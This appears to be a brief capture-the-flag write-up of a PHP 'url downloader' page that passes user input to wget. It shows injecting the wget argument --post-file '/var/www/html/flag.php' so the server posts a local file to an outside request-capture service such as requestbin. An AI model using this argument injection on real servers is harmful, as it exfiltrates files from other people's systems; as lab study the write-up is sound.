after accessing the webpage, we see url downloader 
we can try putting something basic to check what happens
as we insert a link, some kind of code popped up
the website is built on php and it uses wget  
so we can try using wget functions to extract a possible file
since its not enough to only use wget
we try requestbin/postbin/requestinspector (to receive packets/files)
--post-file '/var/www/html/flag.php'
